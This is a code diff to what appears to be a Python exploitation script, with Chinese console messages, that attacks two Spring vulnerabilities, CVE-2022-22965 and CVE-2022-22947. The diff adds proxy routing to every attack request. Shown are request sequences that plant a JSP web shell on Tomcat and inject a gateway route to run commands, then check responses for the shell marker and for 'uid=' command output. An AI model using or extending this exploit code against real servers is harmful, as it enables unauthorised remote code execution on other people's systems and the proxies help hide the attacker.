@@ -7,7 +7,7 @@ from time import sleep
 import urllib3
 urllib3.disable_warnings()
 
-def CVE_2022_22965(url):
+def CVE_2022_22965(url, proxies):
     cprint("================开始对目标URL进行CVE-2022-22965漏洞利用================", "green")
     Headers_1 = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
@@ -25,11 +25,11 @@ def CVE_2022_22965(url):
     getpayload = url + payload_http
     try:
         requests.packages.urllib3.disable_warnings()
-        requests.post(url, headers=Headers_1, data=data1, timeout=5, allow_redirects=False, verify=False)
+        requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(1)
-        requests.post(url, headers=Headers_1, data=data2, timeout=5, allow_redirects=False, verify=False)
+        requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(1)
-        requests.get(getpayload, headers=Headers_1, timeout=5, allow_redirects=False, verify=False)
+        requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(1)
         test = requests.get(url + "tomcatwar.jsp")
         if (test.status_code == 200) and ('aabysszg' in str(test.text)):
@@ -46,7 +46,7 @@ def CVE_2022_22965(url):
     except Exception as e:
         print(e)
 
-def CVE_2022_22947(url):
+def CVE_2022_22947(url, proxies):
     cprint("================开始对目标URL进行CVE-2022-22947漏洞利用================","green")
     headers1 = {
         'Accept-Encoding': 'gzip, deflate',
@@ -72,11 +72,11 @@ def CVE_2022_22947(url):
             }'''
 
     requests.packages.urllib3.disable_warnings()
-    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False)
-    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
-    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
-    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
-    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
+    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
+    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
     if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
         cprint("[+] Payload已经输出，回显结果如下：", "red")
         print('\n')
@@ -85,21 +85,23 @@ def CVE_2022_22947(url):
         cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
         print('\n')
 
-def vul(url):
+def vul(url,proxies):
     if ('://' not in url):
         url = str("http://") + str(url)
     if str(url[-1]) != "/":
         url = url + "/"
     try:
         requests.packages.urllib3.disable_warnings()
-        r = requests.get(url, timeout=6, verify=False)  # 设置超时6秒
+        r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
+        if r.status_code == 503:
+            sys.exit()
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
     except:
         cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
         sys.exit()
-    CVE_2022_22947(url)
-    CVE_2022_22965(url)
+    CVE_2022_22947(url ,proxies)
+    CVE_2022_22965(url ,proxies)
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
